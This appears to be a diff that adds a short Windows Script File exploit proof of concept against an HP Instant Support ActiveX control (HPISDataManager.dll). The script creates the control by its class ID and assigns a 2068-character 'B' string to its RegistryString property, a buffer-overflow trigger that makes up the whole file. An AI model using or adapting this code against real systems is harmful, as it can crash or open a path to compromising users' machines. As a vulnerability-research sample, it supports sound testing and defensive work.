@@ -1,0 +1,16 @@
+&lt;?XML version=&#039;1.0&#039; standalone=&#039;yes&#039; ?&gt;
+&lt;package&gt;&lt;job id=&#039;DoneInVBS&#039; debug=&#039;false&#039; error=&#039;true&#039;&gt;
+&lt;object classid=&#039;clsid:14C1B87C-3342-445F-9B5E-365FF330A3AC&#039; id=&#039;target&#039; /&gt;
+&lt;script language=&#039;vbscript&#039;&gt;
+&#039;for debugging/custom prolog
+targetFile = &quot;C:\WINDOWS\Downloaded Program Files\HPISDataManager.dll&quot;
+prototype = &quot;Property Let RegistryString ( ByVal bstrRegistryKey As String , ByVal bUserKey As Long )
+As String&quot;
+memberName = &quot;RegistryString&quot;
+progid = &quot;HPISDataManagerLib.Datamgr&quot;
+argCount = 3
+arg1=String(2068, &quot;B&quot;)
+arg2=1
+arg3=&quot;defaultV&quot;
+target.RegistryString(arg1 ,arg2 ) = arg3
+&lt;/script&gt;&lt;/job&gt;&lt;/package&gt;
